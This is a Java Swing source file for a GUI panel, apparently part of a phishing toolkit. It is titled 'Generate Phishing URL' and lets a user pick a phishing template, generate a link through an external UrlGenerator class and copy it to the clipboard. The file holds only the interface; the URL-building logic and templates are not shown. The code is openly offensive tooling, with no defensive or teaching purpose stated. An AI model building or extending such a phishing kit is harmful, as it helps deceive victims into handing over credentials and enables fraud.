package org.guercifzone.Simple.Gui_;

import org.guercifzone.DeepSeek.TemplateManager;
import org.guercifzone.DeepSeek.UrlGenerator;

import javax.swing.*;
import java.awt.*;
import java.awt.event.ActionEvent;

public class BuildUrl extends JPanel {
    private JComboBox<String> templateCombo;
    private JTextField urlField;

    public BuildUrl() {
        initComponents();
    }

    private void initComponents() {
        setLayout(new GridBagLayout());
        GridBagConstraints gbc = new GridBagConstraints();
        gbc.insets = new Insets(5, 5, 5, 5);
        gbc.fill = GridBagConstraints.HORIZONTAL;

        // Title
        gbc.gridx = 0;
        gbc.gridy = 0;
        gbc.gridwidth = 2;
        add(new JLabel("Generate Phishing URL"), gbc);

        // Template selection
        gbc.gridy++;
        gbc.gridwidth = 1;
        add(new JLabel("Select Template:"), gbc);


        gbc.gridx++;
        templateCombo = new JComboBox<>();
        TemplateManager.listTemplates().forEach(templateCombo::addItem);
        add(templateCombo, gbc);

        // Generate button
        gbc.gridx = 0;
        gbc.gridy++;
        gbc.gridwidth = 2;
        JButton generateButton = new JButton("Generate URL");
        generateButton.addActionListener(this::generateUrl);
        add(generateButton, gbc);
        // URL display
        gbc.gridy++;
        add(new JLabel("Generated URL:"), gbc);
        gbc.gridy++;
        urlField = new JTextField();
        urlField.setEditable(false);
        add(urlField, gbc);

        // Copy button
        gbc.gridy++;
        JButton copyButton = new JButton("Copy to Clipboard");
        copyButton.addActionListener(e -> {
            if (urlField.getText().isEmpty()) return;
            urlField.selectAll();
            urlField.copy();
            JOptionPane.showMessageDialog(this, "URL copied to clipboard!");
        });
            add(copyButton,gbc);


    }

    private void generateUrl(ActionEvent actionEvent) {
        String selectedTemplate = (String) templateCombo.getSelectedItem();

        if (selectedTemplate != null) {
            String url = UrlGenerator.generateUrl(selectedTemplate);
            urlField.setText(url);
        }
    }
}
